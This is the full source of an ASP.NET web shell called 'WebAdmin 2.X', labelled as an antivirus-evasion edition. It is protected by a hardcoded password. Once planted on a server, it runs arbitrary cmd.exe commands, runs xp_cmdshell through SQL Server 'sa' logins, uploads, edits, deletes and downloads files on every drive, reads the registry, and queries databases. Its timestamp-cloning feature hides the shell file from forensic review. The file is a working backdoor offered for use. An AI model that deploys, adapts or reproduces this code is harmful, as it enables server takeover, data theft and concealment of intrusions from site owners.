小七免杀版
<%@ Page Language="VB" ContentType="text/html"  validateRequest="false" aspcompat="true"%>
<%@ Import Namespace="System.IO" %>
<%@ import namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.Win32" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.OleDb" %>
<script runat="server">
Dim PASSWORD as string = "xiaoqi"   '密码是xiaoqi  自己改吧  
'----------------------------------------------------------------------
'-----------------           WebAdmin by lake2        -----------------
'-----------------       E-mail: lakl2@mail.csdn.net  -----------------
'-----------------           http://lake2.0x54.com    -----------------
'-----------------              Version 2.X           -----------------
'-----------------            Build (20050719)        -----------------
'----------------------------------------------------------------------
'  Description:
'    1. This program run on ASP.NET environment,control the web
'    2. It looks like backdoor , but I wish you like it .
'    3. If you have some words to me , please send me a Email
'------------
dim ur1,TEMP1,TEMP2,TITLE,SORTFILED as string
Sub Login_click(sender As Object, E As EventArgs)
	if Textbox.Text=PASSWORD then     
		session("lake2")=1
		session.Timeout=45
	else
		response.Write("<font color='red'>密码错误！</font><br>")
	end if
End Sub
Sub RunCMD(Src As Object, E As EventArgs)
	Dim myProcess As New Process()
	Dim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)
	myProcessStartInfo.UseShellExecute = False
	myProcessStartInfo.RedirectStandardOutput = true
	myProcess.StartInfo = myProcessStartInfo
	myProcessStartInfo.Arguments="/c " & Cmd.texT
	myProcess.Start()
	Dim myStreamReader As StreamReader = myProcess.StandardOutput
	Dim myString As String = myStreamReader.Readtoend()
	myProcess.Close()
	mystring=replace(mystring,">","&lt;")
	mystring=replace(mystring,"<","&gt;")
	result.text=Cmd.text & vbcrlf & "<pre>" & mystring & "</pre>"
	Cmd.text=""
End Sub
Sub CloneTime(Src As Object, E As EventArgs)
	existdir(time1.Text)
	existdir(time2.Text)
	Dim thisfile As FileInfo =New FileInfo(time1.Text)
	Dim thatfile As FileInfo =New FileInfo(time2.Text)
	thisfile.LastWriteTime = thatfile.LastWriteTime
	thisfile.LastAccessTime = thatfile.LastAccessTime
	thisfile.CreationTime = thatfile.CreationTime
	response.Write("<font color=""red"">Clone Time 成功!</font>")
End Sub
Sub ReadReg(Src As Object, E As EventArgs)
	Dim error_x as Exception
Try
	Dim hu As String = Reg1.Text
	Dim rk As RegistryKey
	Select Mid( hu ,1 , Instr( hu,"\" )-1 )
		case "HKEY_LOCAL_MACHINE"
			rk = Registry.LocalMachine.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
		case "HKEY_CLASSES_ROOT"
			rk = Registry.ClassesRoot.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
		case "HKEY_CURRENT_USER"
			rk = Registry.CurrentUser.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
		case "HKEY_USERS"
			rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
		case "HKEY_CURRENT_CONFIG"
			rk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
	End Select
	Label1.Text = rk.GetValue(Reg2.Text , "NULL")
	rk.Close()
Catch error_x
	Label1.Text = "有错误发生！或许是不存在该键值。"
End Try
End Sub
sub Editor(Src As Object, E As EventArgs)
	dim mywrite as new streamwriter(filepath.text,false,encoding.default)
	mywrite.write(content.text)
	mywrite.close
	response.Write("<script>alert('编辑|生成文件 " & replace(filepath.text,"\","\\") & " 成功！请刷新之！')</sc"&"ript>")
end sub
Sub UpLoad(Src As Object, E As EventArgs)
	dim filename,loadpath as string
	filename=path.getfilename(UpFile.value)
	loadpath=request.QueryString("src") & filename
	if  file.exists(loadpath)=true then 
		response.Write("<script>alert('文件" & replace(loadpath,"\","\\") & " 已经存在，上传失败！')</sc"&"ript>")
		response.End()
	end if
	UpFile.postedfile.saveas(loadpath)
	response.Write("<script>alert('文件 " & replace(filename,"\","\\") & " 上传成功！\n文件信息如下：\n\n本地路径：" & replace(UpFile.value,"\","\\") & "\n文件大小：" & UpFile.postedfile.contentlength & " bytes\n远程路径：" & replace(loadpath,"\","\\") & "\n');</scri"&"pt>")
End Sub
Sub NewFD(Src As Object, E As EventArgs)
	ur1=request.form("src")
	if NewFile.Checked = True then
		dim mywrite as new streamwriter(ur1 & NewName.Text,false,encoding.default)
		mywrite.close
		response.Redirect(request.ServerVariables("URL") & "?action=edit&src=" & server.UrlEncode(ur1 & NewName.Text))
	else
		directory.createdirectory(ur1 & NewName.Text)
		response.Write("<script>alert('生成文件夹 " & replace(ur1 & NewName.Text ,"\","\\") & " 成功！刷新之！');</sc" & "ript>")
	end if
End Sub
Sub del(a)
	if right(a,1)="\" then
		dim xdir as directoryinfo
		dim mydir as new DirectoryInfo(a)
		dim xfile as fileinfo
		for each xfile in mydir.getfiles()
			file.delete(a & xfile.name)
		next
		for each xdir in mydir.getdirectories()
			call del(a & xdir.name & "\")
		next
		directory.delete(a)
	else
		file.delete(a)
	end if
End Sub
Sub copydir(a,b)
	dim xdir as directoryinfo
	dim mydir as new DirectoryInfo(a)
	dim xfile as fileinfo
	for each xfile in mydir.getfiles()
		file.copy(a & "\" & xfile.name,b & xfile.name)
	next
	for each xdir in mydir.getdirectories()
		directory.createdirectory(b & path.getfilename(a & xdir.name))
		call copydir(a & xdir.name & "\",b & xdir.name & "\")
	next
End Sub
Sub xexistdir(temp,ow)
	if directory.exists(temp)=true or file.exists(temp)=true then 
		if ow=0  then
			response.Redirect(request.ServerVariables("URL") & "?action=samename&src=" & server.UrlEncode(ur1))
		elseif ow=1 then
			del(temp)
		else
			dim d as string = session("cutboard")
			if right(d,1)="\" then
				TEMP1=ur1 & second(now) & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			else
				TEMP2=ur1 & second(now) & replace(path.getfilename(d),"","")
			end if
		end if
	end if
End Sub
Sub existdir(temp)
		if  file.exists(temp)=false and directory.exists(temp)=false then 
			response.Write("<script>alert('不存在路径 " & replace(temp,"\","\\")  &"！');</sc" & "ript>")
			response.Write("<br><br><a href='javascript:history.back(1);'>返回</a>")
			response.End()
		end if
End Sub
Sub RunSQLCMD(Src As Object, E As EventArgs)
	Dim adoConn,strQuery,recResult,strResult
	if SqlName.Text<>"" then
		adoConn=Server.CreateObject("ADODB.Connection") 
		adoConn.Open("Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text) 
		If Sqlcmd.Text<>"" Then 
			strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'" 
	  		recResult = adoConn.Execute(strQuery) 
 	 		If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
    				strResult = strResult & chr(13) & recResult(0).value
    				recResult.MoveNext 
   				Loop 
 	 		End if 
  			recResult = Nothing 
  			strResult = Replace(strResult," ","&nbsp;") 
  			strResult = Replace(strResult,"<","&lt;") 
  			strResult = Replace(strResult,">","&gt;") 
			resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
			SqlCMD.Text=""
		 End if 
  		adoConn.Close 
	 End if
 End Sub
Function GetStartedTime(ms) 
	GetStartedTime=cint(ms/(1000*60*60))
End function
Function getIP() 
    Dim strIPAddr1 as string
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
        strIPAddr1 = Request.ServerVariables("REMOTE_ADDR")
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
        strIPAddr1 = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
        strIPAddr1 = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)
    Else
        strIPAddr1 = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
    End If
    getIP = Trim(Mid(strIPAddr1, 1, 30))
End Function
Function Getparentdir(nowdir)
	dim temp,k as integer
	temp=1
	k=0
	if len(nowdir)>4 then 
		nowdir=left(nowdir,len(nowdir)-1) 
	end if
	do while temp<>0
		k=temp+1
		temp=instr(temp,nowdir,"\")
		if temp =0 then
			exit do
		end if
		temp = temp+1
	loop
	if k<>2 then
		getparentdir=mid(nowdir,1,k-2)
	else
		getparentdir=nowdir
	end if
End function
Function Rename()
	ur1=request.QueryString("src")
	if file.exists(Getparentdir(ur1) & request.Form("name")) then
		rename=0   
	else
		file.copy(ur1,Getparentdir(ur1) & request.Form("name"))
		del(ur1)
		rename=1
	end if
End Function 
Function GetSize(temp)
	if temp < 1024 then
		GetSize=temp & " bytes"
	else
		if temp\1024 < 1024 then
			GetSize=temp\1024 & " KB"
		else
			if temp\1024\1024 < 1024 then
				GetSize=temp\1024\1024 & " MB"
			else
				GetSize=temp\1024\1024\1024 & " GB"
			end if
		end if
	end if
End Function 
	Sub downTheFile(thePath)
		dim stream
		stream=server.createObject("adodb.stream")
		stream.open
		stream.type=1
		stream.loadFromFile(thePath)
		response.addHeader("Content-Disposition", "attachment; filename=" & replace(server.UrlEncode(path.getfilename(thePath)),"+"," "))
		response.addHeader("Content-Length",stream.Size)
		response.charset="UTF-8"
		response.contentType="application/octet-stream"
		response.binaryWrite(stream.read)
		response.flush
		stream.close
		stream=nothing
		response.End()
	End Sub
Sub Page_Load(sender As Object, E As EventArgs)
	if request.QueryString("table")<>"" then
		Call ShowTable()
	end if
End Sub
Sub ShowTable()
	DB_eButton.Visible = True
	DB_eString.Visible = True
	DB_exe.Visible = True
	DB_CString.Text = session("DBC") 
	if instr(DB_CString.Text,":\")<>0 then
		DB_rB_Access.Checked = true
		DB_rB_MSSQL.Checked = false
	else
		DB_rB_Access.Checked = false
		DB_rB_MSSQL.checked = true
	end if
	Call BindData()
End Sub
Sub DB_ReLoad(sender As Object, E As EventArgs)
	response.Redirect(request.ServerVariables("PATH_INFO") & "?action=data")
End Sub
Sub DB_oneB(sender As Object, E As EventArgs)
	Dim error_x as Exception
	Try
	Dim db_conn As New OleDbConnection(session("DBC"))
	Dim db_cmd As New OleDbCommand( DB_EString.Text , db_conn ) 
	db_conn.Open()
	db_cmd.ExecuteNonQuery()
	db_conn.Close()
	Call BindData()
	Catch error_x
	response.Write("<font color=""red"">错误：</font>"&error_x.Message)
	response.End()
	End Try
End Sub
Sub DB_onrB_1(sender As Object, E As EventArgs)
	DB_CString.Text = "server=(local);UID=sa;PWD=;database=dvnews;Provider=SQLOLEDB"
	DB_rB_Access.Checked = false
	DB_rB_MSSQL.Checked = true
End Sub
Sub DB_onrB_2(sender As Object, E As EventArgs)
	DB_rB_Access.Checked = true
	DB_rB_MSSQL.Checked = false
	DB_CString.Text = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\MyWeb\UpdateWebadmin\guestbook.mdb"
End Sub
Sub DB_onsB(sender As Object, E As EventArgs)
	DB_eButton.Visible = True
	DB_eString.Visible = True
	DB_exe.Visible = True
	session("DBC") = DB_CString.Text
	Dim i As Integer
	Dim db_conn As New OleDbConnection(DB_CString.Text)
	Dim db_schemaTable As DataTable 
	db_conn.open()
	db_schemaTable = db_conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, New Object() {Nothing, Nothing, Nothing, "TABLE"})
	For i = 0 To db_schemaTable.Rows.Count - 1
		db_Label.Text += "<a href='?action=data&table=" & db_schemaTable.Rows(i)!TABLE_NAME.ToString & "'>" & db_schemaTable.Rows(i)!TABLE_NAME.ToString & "</a><br>"
	Next i
	db_conn.close()
End Sub
Sub DB_Page(sender As Object, e As System.Web.UI.WebControls.DataGridPageChangedEventArgs)
	DB_DataGrid.CurrentPageIndex = e.NewPageIndex
	Call BindData()
End Sub
Sub DB_Sort(sender As Object, E As DataGridSortCommandEventArgs)
	SORTFILED = E.SortExpression
	Call BindData()
End Sub
Sub BindData()
	Dim db_conn As New OleDbConnection(session("DBC"))
	Dim db_cmd As New OleDbCommand("select * from " & request.QueryString("table") , db_conn ) 
	Dim db_adp As New OleDbDataAdapter(db_cmd)
	Dim db_ds As New DataSet()
	db_adp.Fill(db_ds,request.QueryString("table"))
	DB_DataGrid.DataSource = db_ds.Tables(request.QueryString("table")).DefaultView
	db_ds.Tables(request.QueryString("table")).DefaultView.Sort = SORTFILED
	DB_DataGrid.DataBind()
End Sub
</script>
<%
if request.QueryString("action")="down" and session("lake2")=1 then
		downTheFile(request.QueryString("src"))
		response.End()
end if
Dim hu as string = request.QueryString("action")
if hu="cmd" then 
TITLE="WebAdmin 2.X -- CMD"
elseif hu="sqlrootkit" then 
TITLE="WebAdmin 2.X -- SqlRootKit"
elseif hu="clonetime" then 
TITLE="WebAdmin 2.X -- CloneTime"
elseif hu="information" then 
TITLE="WebAdmin 2.X -- WebServerInfo"
elseif hu="reg" then 
TITLE="WebAdmin 2.X -- RegRead"
elseif hu="goto" then 
TITLE="WebAdmin 2.X -- FileManager"
elseif hu="data" then 
TITLE="WebAdmin 2.X -- ControlDataBase"
else 
TITLE=request.ServerVariables("HTTP_HOST") 
end if
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<style type="text/css">
body,td,th {
	color: #0000FF;
	font-family: Verdana;
}
body {
	background-color: #ffffff;
	font-size:14px; 
}
a:link {
	color: #0000FF;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
	color: #0000FF;
}
a:hover {
	text-decoration: none;
	color: #FF0000;
}
a:active {
	text-decoration: none;
	color: #FF0000;
}
.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
.TextBox {border: 1px solid #084B8E}
.style3 {color: #FF0000}
</style>
<head>
<meta http-equiv="Content-Type" content="text/html" charset=gb2312>
<title><%=TITLE%></title>
</head>
<body>
<%
Dim error_x as Exception
Try
if session("lake2")<>1 then
	response.Write("<br>")
	response.Write("Hello , thank you for using my program !<br>")
	response.Write("This program is run at ASP.NET Environment and manage the web directory.<br>")
	response.Write("Maybe this program looks like a backdoor , but I wish you like it and don't hack :p<br><br>")
	response.Write("<span class=""style3"">Notice:</span> only click ""Login"" to login.")
%>
<form runat="server">
  Your Password:<asp:TextBox ID="TextBox" runat="server"  TextMode="Password" class="TextBox" />  
  <asp:Button  ID="Button" runat="server" Text="Login" ToolTip="Click here to login"  OnClick="login_click" class="buttom" />
</form> 
<%
else
	dim temp as string
	temp=request.QueryString("action")
	if temp="" then temp="goto"
	select case temp
	case "goto"
		if request.QueryString("src")<>"" then
			ur1=request.QueryString("src")
		else
			ur1=server.MapPath(".") & "\"
		end if
	call existdir(ur1)
	dim xdir as directoryinfo
	dim mydir as new DirectoryInfo(ur1)
	dim hupo as string
	dim xfile as fileinfo
%>
<p align="center">当前目录：<font color=red><%=ur1%></font></p>
<table width="70%"  border="0" align="center">
  <tr>
    <td width="13%">Operate:</td>
    <td width="87%"><a href="?action=new&src=<%=server.UrlEncode(ur1)%>" title="新建文件或目录" target="_blank">新建</a>
      <%if session("cutboard")<>"" then%>
      <a href="?action=plaster&src=<%=server.UrlEncode(ur1)%>" title="粘贴虚拟剪贴板内容">粘贴</a>
      <%else%>
粘贴
<%end if%>
<a href="?action=upfile&src=<%=server.UrlEncode(ur1)%>" title="上传文件" target="_blank">上传</a> <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="回到本文件所在目录">返回 </a><a href="?action=logout" title="Exit">离开</a></td>
  </tr>
  <tr>
    <td>
	转到：</td>
    <td>
<%
dim i as integer
for i =0 to Directory.GetLogicalDrives().length-1
 	response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & " </a>")
next
%>
</td>
  </tr>

  <tr>
    <td>工具：</td>
    <td><a href="?action=sqlrootkit" target="_blank">SqlRootKit.NET </a><a href="?action=cmd" target="_blank">CMD.NET</a> <a href="?action=clonetime&src=<%=server.UrlEncode(ur1)%>" target="_blank">CloneTime</a> <a href="?action=information" target="_blank">SysInfomation</a> <a href="?action=reg" target="_blank">ReadReg</a> <a href="?action=data" target="_blank">DataBase</a> </td>
  </tr>
</table>
<hr noshade>
<table width="90%"  border="0" align="center">
	<tr>
	<td width="40%"><strong>名称</strong></td>
	<td width="15%"><strong>大小</strong></td>
	<td width="20%"><strong>修改时间</strong></td>
	<td width="25%"><strong>操作</strong></td>
	</tr>
      <tr>
        <td><%
		hupo= "<tr><td><a href='?action=goto&src=" & server.UrlEncode(Getparentdir(ur1)) & "'><i>|父目录|</i></a></td></tr>"
		response.Write(hupo)
		for each xdir in mydir.getdirectories()
			response.Write("<tr>")
			dim filepath as string 
			filepath=server.UrlEncode(ur1 & xdir.name)
			hupo= "<td><a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.name & "</a></td>"
			response.Write(hupo)
			response.Write("<td>&lt;dir&gt;</td>")
			response.Write("<td>" & Directory.GetLastWriteTime(ur1 & xdir.name) & "</td>")
			hupo="<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>剪切" & "</a>|<a href='?action=copy&src=" & filepath & "\'  target='_blank'>复制</a>|<a href='?action=del&src=" & filepath & "\'" & " onclick='return del(this);'>删除</a></td>"
			response.Write(hupo)
			response.Write("</tr>")
		next
		%></td>
  </tr>
		<tr>
        <td><%
		for each xfile in mydir.getfiles()
			dim filepath2 as string
			filepath2=server.UrlEncode(ur1 & xfile.name)
			response.Write("<tr>")
			hupo="<td>" & xfile.name & "</td>"
			response.Write(hupo)
			hupo="<td>" & GetSize(xfile.length) & "</td>"
			response.Write(hupo)
			response.Write("<td>" & file.GetLastWriteTime(ur1 & xfile.name) & "</td>")
			hupo="<td><a href='?action=edit&src=" & filepath2 & "' target='_blank'>编辑</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>剪切</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>粘贴</a>|<a href='?action=rename&src=" & filepath2 & "' target='_blank'>重命名</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>下载</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>删除</a></td>"
			response.Write(hupo)
			response.Write("</tr>")
		next
		response.Write("</table>")
		%></td>
      </tr>
</table>
<script language="javascript">
function del()
{
if(confirm("想好哦，真的删除吗？")){return true;}
else{return false;}
}
function down()
{
if(confirm("如果文件大于10M，最好是通过http协议下载！\n还要下载吗？")){return true;}
else{return false;}
}
</script>
<%
case "information"
	dim CIP,CP as string
	if getIP()<>request.ServerVariables("REMOTE_ADDR") then
			CIP=getIP()
			CP=request.ServerVariables("REMOTE_ADDR")
	else
			CIP=request.ServerVariables("REMOTE_ADDR")
			CP="None"
	end if
%>
<table width="80%"  border="1" align="center">
  <tr>
    <td colspan="2"><span class="style3">Web Server Information                 </span><i><a href="javascript:closewindow();">关闭</a></i></td>
  </tr>
  <tr>
    <td width="40%">Server IP</td>
    <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
  </tr>
  <tr>
    <td height="73">Machine Name</td>
    <td><%=Environment.MachineName%></td>
  </tr>
  <tr>
    <td>Network Name</td>
    <td><%=Environment.UserDomainName.ToString()%></td>
  </tr>
  <tr>
    <td>User Name in this Process</td>
    <td><%=Environment.UserName%></td>
  </tr>
  <tr>
    <td>OS Version</td>
    <td><%=Environment.OSVersion.ToString()%></td>
  </tr>
  <tr>
    <td>Started Time</td>
    <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>
  </tr>
  <tr>
    <td>System Time</td>
    <td><%=now%></td>
  </tr>
  <tr>
    <td>IIS Version</td>
    <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
  </tr>
  <tr>
    <td>HTTPS</td>
    <td><%=request.ServerVariables("HTTPS")%></td>
  </tr>
  <tr>
    <td>PATH_INFO</td>
    <td><%=request.ServerVariables("PATH_INFO")%></td>
  </tr>
  <tr>
    <td>PATH_TRANSLATED</td>
    <td><%=request.ServerVariables("PATH_TRANSLATED")%></td>
  <tr>
    <td>SERVER_PORT</td>
    <td><%=request.ServerVariables("SERVER_PORT")%></td>
  </tr>
    <tr>
    <td>SeesionID</td>
    <td><%=Session.SessionID%></td>
  </tr>
  <tr>
    <td colspan="2"><span class="style3">Client Infomation</span></td>
  </tr>
  <tr>
    <td>Client Proxy</td>
    <td><%=CP%></td>
  </tr>
  <tr>
    <td>Client IP</td>
    <td><%=CIP%></td>
  </tr>
  <tr>
    <td>User</td>
    <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
  </tr>
</table>
<%
	case "cmd"
%>
<form runat="server">
  <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:closewindow();">Close</a></i></p>
  <p> Execute command with ASP.NET account(<span class="style3">Notice: only click &quot;Run&quot; to run</span>)</p>
  <p>CMD.exe's Path: 
    <asp:TextBox ID="cmdpath" runat="server" class="TextBox" Text="cmd.exe"/>      </p>
  Command:
  <asp:TextBox ID="cmd" runat="server" Width="300" class="TextBox" />
  <asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom"/>  
  <p>
   <asp:Label ID="result" runat="server" style="style2"/>      </p>
</form>
<%
	case "sqlrootkit"
%>
<form runat="server">
  <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:closewindow();">Close</a></i></p>
  <p> Execute command with SQLServer account(<span class="style3">Notice: only click "Run" to run</span>)</p>
  <p>Host:
    <asp:TextBox ID="ip" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/></p>
  <p>
  SQL Name:
    <asp:TextBox ID="SqlName" runat="server" Width="50" class="TextBox" Text='sa'/>
  SQL Password:
  <asp:TextBox ID="SqlPass" runat="server" Width="80" class="TextBox"/>
  </p>
  Command:
  <asp:TextBox ID="Sqlcmd" runat="server" Width="300" class="TextBox"/>
  <asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" class="buttom"/>  
  <p>
   <asp:Label ID="resultSQL" runat="server" style="style2"/>      </p>
</form>
<%
	case "del"
		dim a as string
		a=request.QueryString("src")
		call existdir(a)
		call del(a)  
		response.Write("<script>alert(""删除文件 " & replace(a,"\","\\") & " 成功！"");location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(a)) &"'</script>")
	case "copy"
		call existdir(request.QueryString("src"))
		session("cutboard")="" & request.QueryString("src")
		response.Write("<script>alert('文件已经复制到虚拟剪切板，进入目的文件夹点粘贴即可！');location.href='JavaScript:self.close()';</script>")
	case "cut"
		call existdir(request.QueryString("src"))
		session("cutboard")="" & request.QueryString("src")
		response.Write("<script>alert('文件已经剪切到虚拟剪切板，进入目的文件夹点粘贴即可！');location.href='JavaScript:self.close()';</script>")
	case "plaster"
		dim ow as integer
		if request.Form("OverWrite")<>"" then ow=1
		if request.Form("Cancel")<>"" then ow=2
		ur1=request.QueryString("src")
		call existdir(ur1)
		dim d as string
		d=session("cutboard")
		if left(d,1)="" then
			TEMP1=ur1 & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			TEMP2=ur1 & replace(path.getfilename(d),"","")
			if right(d,1)="\" then   
				call xexistdir(TEMP1,ow)
				directory.move(replace(d,"",""),TEMP1 & "\")  
				response.Write("<script>alert('剪切  " & replace(replace(d,"",""),"\","\\") & "  到  " & replace(TEMP1 & "\","\","\\") & "  成功！');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(ur1) &"'</script>")
			else
				call xexistdir(TEMP2,ow)
				file.move(replace(d,"",""),TEMP2)
				response.Write("<script>alert('剪切  " & replace(replace(d,"",""),"\","\\") & "  到  " & replace(TEMP2,"\","\\") & "  成功！');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(ur1) &"'</script>")
			end if
		else
			TEMP1=ur1 & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			TEMP2=ur1 & path.getfilename(replace(d,"",""))
			if right(d,1)="\" then 
				call xexistdir(TEMP1,ow)
				directory.createdirectory(TEMP1)
				call copydir(replace(d,"",""),TEMP1 & "\")
				response.Write("<script>alert('复制  " & replace(replace(d,"",""),"\","\\") & "  到  " & replace(TEMP1 & "\","\","\\") & "  成功！');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(ur1) &"'</script>")
			else
				call xexistdir(TEMP2,ow)
				file.copy(replace(d,"",""),TEMP2)
				response.Write("<script>alert('复制  " & replace(replace(d,"",""),"\","\\") & "  到  " & replace(TEMP2,"\","\\") & "  成功！');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(ur1) &"'</script>")
			end if
		end if
	case "upfile"
		ur1=request.QueryString("src")
%>
<form name="UpFileForm" enctype="multipart/form-data" method="post" action="?src=<%=server.UrlEncode(ur1)%>" runat="server"  onSubmit="return checkname();">
 你将上传文件到目录 <span class="style3"><%=ur1%></span><br>
 选择要传的文件吧：
 <input name="upfile" type="file" class="TextBox" id="UpFile" runat="server">
    <input type="submit" id="UpFileSubit" value="Upload" runat="server" onserverclick="UpLoad" class="buttom">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">返回</a>
<%
	case "new"
		ur1=request.QueryString("src")
%>
<form runat="server">
  <%=ur1%><br>
  名称：
  <asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox"/>
  <br>
  <asp:RadioButton ID="NewFile" Text="File" runat="server" GroupName="New" Checked="true"/>
  <asp:RadioButton ID="NewDirectory" Text="Directory" runat="server"  GroupName="New"/> 
  <br>
  <asp:Button ID="NewButton" Text="Submit" runat="server" CssClass="buttom"  OnClick="NewFD"/>  
  <input name="Src" type="hidden" value="<%=ur1%>">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">返回</a>
<%
	case "edit"
		dim b as string
		b=request.QueryString("src")
		call existdir(b)
		dim myread as new streamreader(b,encoding.default)
		filepath.text=b
		content.text=myread.readtoend
%>
<form runat="server">
  <table width="80%"  border="1" align="center">
    <tr>      <td width="11%">路径</td>
      <td width="89%">
      <asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="300"/>
      *</td>
    </tr>
    <tr>
      <td>内容</td> 
      <td> <asp:TextBox ID="content" Rows="25" Columns="100" TextMode="MultiLine" runat="server" CssClass="TextBox"/></td>
    </tr>
    <tr>
      <td></td>
      <td> <asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" CssClass="buttom"/>         
      </td>
    </tr>
  </table>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">返回</a>
<%
  		myread.close
	case "rename"
		ur1=request.QueryString("src")
		if request.Form("name")="" then
	%>
<form name="formRn" method="post" action="?action=rename&src=<%=server.UrlEncode(request.QueryString("src"))%>" onSubmit="return checkname();">
  <p>你将重命名 <span class="style3"><%=request.QueryString("src")%></span> 为： <%=getparentdir(request.QueryString("src"))%>
    <input type="text" name="name" class="TextBox">
    <input type="submit" name="Submit3" value="Submit" class="buttom">
</p>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">返回</a>
<script language="javascript">
function checkname()
{
if(formRn.name.value==""){alert("你应该输入文件名啊 :(");return false}
}
</script>
  <%
		else
			if Rename() then
				response.Write("<script>alert('重命名 " & replace(ur1,"\","\\") & " 为 " & replace(Getparentdir(ur1) & request.Form("name"),"\","\\") & " 成功！请刷新之！');location.href='JavaScript:self.close()';</script>")
			else
				response.Write("<script>alert('存在同名文件，重命名失败 :(');location.href='JavaScript:self.close()';</script>")
			end if
		end if
	case "samename"
		ur1=request.QueryString("src")
%>
<form name="form1" method="post" action="?action=plaster&src=<%=server.UrlEncode(ur1)%>">
<p class="style3">存在同名文件，是否覆盖？（如果你选NO，我将自动添加一个数字前缀）</p>
  <input name="OverWrite" type="submit" id="OverWrite" value="Yes" class="buttom">
<input name="Cancel" type="submit" id="Cancel" value="No" class="buttom">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">返回</a>
   <%
    case "clonetime"
		time1.Text=request.QueryString("src")&"webadmin2X.aspx"
		time2.Text=request.QueryString("src")
	%>
<form runat="server">
  <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:closewindow();">关闭</a></i> </p>
  <p>A tool that it copy the file or directory's time to another file or directory </p>
  <p>Rework File or Dir:
    <asp:TextBox CssClass="TextBox" ID="time1" runat="server" Width="300"/></p>
  <p>Copied File or Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <asp:TextBox CssClass="TextBox" ID="time2" runat="server" Width="300"/></p>
<asp:Button ID="ButtonClone" Text="Submit" runat="server" CssClass="buttom" OnClick="CloneTime"/>
</form>
<p>
  <%
    case "reg"
  %>
<form runat="server">
  <p>[Read Reg for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:closewindow();">关闭</a></i> </p>
  <p>A tool that it can read regedit </p>
 Key : <asp:TextBox ID="Reg1" runat="server" Width="500" CssClass="TextBox" Text="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"/>  
<br>
  Value: 
  <asp:TextBox ID="Reg2" runat="server" CssClass="TextBox" Text="KAVRun"/>  
<asp:Button ID="RegButtom" runat="server" Text="Sumbit" OnClick="ReadReg" CssClass="buttom"/>  
</form>
